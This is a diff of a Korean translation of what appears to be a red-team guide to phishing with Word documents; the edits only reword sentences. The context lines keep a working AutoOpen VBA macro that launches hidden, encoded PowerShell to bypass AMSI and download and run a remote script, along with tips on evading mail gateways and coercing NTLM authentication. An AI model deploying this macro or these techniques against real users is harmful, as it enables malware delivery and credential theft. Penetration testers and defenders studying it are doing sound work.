@@ -19,7 +19,7 @@ DOCX 파일이 원격 템플릿을 참조하는 경우 (파일 – 옵션 – �
 ### 외부 이미지 로드
 
 이동: _삽입 --> 빠른 부분 --> 필드_\
-&#xNAN;_**카테고리**: 링크 및 참조, **필드 이름**: includePicture, 및 **파일 이름 또는 URL**:_ http://\<ip>/whatever
+_**카테고리**: 링크 및 참조, **필드 이름**: includePicture, 및 **파일 이름 또는 URL**:_ http://\<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
@@ -34,7 +34,7 @@ DOCX 파일이 원격 템플릿을 참조하는 경우 (파일 – 옵션 – �
 - AutoOpen()
 - Document_Open()
 
-#### 매크로 코드 예시
+#### 매크로 코드 예제
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -71,7 +71,7 @@ proc.Create "powershell <beacon line generated>
 #### 문서 확장자
 
 작업이 끝나면 **다른 이름으로 저장** 드롭다운에서 형식을 **`.docx`**에서 **Word 97-2003 `.doc`**로 변경합니다.\
-이렇게 하는 이유는 **`.docx`** 안에 매크로를 저장할 수 없고, 매크로 사용 가능 **`.docm`** 확장자에 대한 **오명**이 있기 때문입니다 (예: 썸네일 아이콘에 큰 `!`가 있고 일부 웹/이메일 게이트웨이가 이를 완전히 차단합니다). 따라서 이 **구식 `.doc` 확장자가 최선의 타협**입니다.
+이렇게 하는 이유는 **`.docx`** 안에 매크로를 저장할 수 없고 매크로 사용 가능 **`.docm`** 확장자에 대한 **오명**이 있기 때문입니다 (예: 썸네일 아이콘에 큰 `!`가 있고 일부 웹/이메일 게이트웨이가 이를 완전히 차단합니다). 따라서 이 **구식 `.doc` 확장자가 최선의 타협**입니다.
 
 #### 악성 매크로 생성기
 
@@ -140,7 +140,7 @@ self.close
 ```
 ## NTLM 인증 강제화
 
-**NTLM 인증을 "원격으로" 강제화하는 방법은 여러 가지가 있습니다.** 예를 들어, 사용자가 접근할 이메일이나 HTML에 **보이지 않는 이미지**를 추가할 수 있습니다(HTTP MitM도 가능할까요?). 또는 피해자에게 **폴더를 열기만 해도 인증을 트리거하는 파일의 주소**를 보낼 수 있습니다.
+여러 가지 방법으로 **NTLM 인증을 "원격으로" 강제화**할 수 있습니다. 예를 들어, 사용자가 접근할 **보이지 않는 이미지**를 이메일이나 HTML에 추가할 수 있습니다(HTTP MitM도 가능할까요?). 또는 피해자에게 **폴더를 열기만 해도 인증을 트리거하는 파일의 주소**를 보낼 수 있습니다.
 
 **다음 페이지에서 이러한 아이디어와 더 많은 내용을 확인하세요:**
 
@@ -154,7 +154,7 @@ self.close
 
 ### NTLM 릴레이
 
-해시나 인증을 훔치는 것뿐만 아니라 **NTLM 릴레이 공격을 수행할 수 있다는 것을 잊지 마세요**:
+해시나 인증을 훔치는 것뿐만 아니라 **NTLM 릴레이 공격을 수행할 수 있다는 점을 잊지 마세요**:
 
 - [**NTLM 릴레이 공격**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
 - [**AD CS ESC8 (인증서에 대한 NTLM 릴레이)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)
